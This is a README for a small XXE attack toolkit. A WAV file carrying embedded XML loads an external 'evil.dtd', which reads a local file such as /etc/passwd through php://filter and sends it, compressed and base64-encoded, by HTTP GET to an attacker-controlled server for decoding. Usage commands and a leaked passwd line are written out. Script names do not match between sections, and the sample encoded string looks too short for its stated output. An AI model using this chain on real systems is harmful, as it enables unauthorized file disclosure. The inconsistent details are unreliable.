# XXE Test Payload Toolkit (WAV + External DTD)

This repository contains **two small utilities** designed to **safely test whether XXE (XML External Entity) vulnerabilities are exploitable** in an **authorized internal environment**.

The toolkit simulates a **realistic XXE exfiltration chain** using:

- External DTD loading
- PHP stream wrappers (`php://filter`)
- Zlib + Base64 encoding
- Binary container payload (`.wav` with embedded XML)

---

## ⚠️ Legal & Ethical Warning

> **DO NOT use this toolkit against systems you do not own or have explicit permission to test.**

- XXE attacks can lead to **arbitrary file disclosure**
- Unauthorized testing may violate laws or company policies
- This repository is intended **only for internal security testing, research, and validation**

---

## 🧩 Components

### 1️⃣ `zlib_base64_decoder.php`

A helper script to **decode exfiltrated XXE data**.

#### Function
- Base64 decode
- Zlib inflate
- Output original file content

#### Purpose
Used **after successful XXE exploitation** to reconstruct the leaked file contents.

---

### 2️⃣ `xxe_generator.py`

A payload generator that creates:

- `evil.dtd` — malicious external DTD
- `payload.wav` — WAV file containing embedded XML with XXE payload

#### Purpose
Used to test whether a target application:
- Parses XML inside binary containers
- Allows external entity resolution
- Permits outbound HTTP requests

---

## 🧪 Attack Flow (High-Level)
```
Target XML parser
↓
Loads external DTD (evil.dtd)
↓
DTD reads local file using php://filter
↓
File is compressed (zlib) + base64 encoded
↓
Exfiltrated via HTTP GET to attacker-controlled server
↓
Captured string decoded using zlib_base_decoder.php
```

---

## 📦 Requirements

### Python Script
- Python 3.x

### PHP Script
- PHP with:
  - `zlib` enabled
  - `base64_decode()`
  - `zlib_decode()`

---

## 🚀 Usage

### Step 1: Generate XXE Payloads

```bash
python3 xxe_payload_generator.py <host:port> <file_path>
```
```
python3 xxe_payload_generator.py 127.0.0.1:8000 /etc/passwd
```
### Output files
```
evil.dtd
payload.wav
```

### evil.dtd
External DTD responsible for file extraction and exfiltration

### payload.wav
WAV container with embedded XML + XXE payload

### Step 2: Host the DTD & Receive Exfiltration

### Run a simple HTTP server:
```
python3 -m http.server 8000
```

### Expected request example:
```
GET /?p=eJyrVkrLz1eyUkpKLFKqBQBKDQME
```
### Step 3: Decode Leaked Data
```
php xxe_decode.php <base64_string>
```
### Example
```
php xxe_decode.php eJyrVkrLz1eyUkpKLFKqBQBKDQME
```
### Output
```
root:x:0:0:root:/root:/bin/bash
...


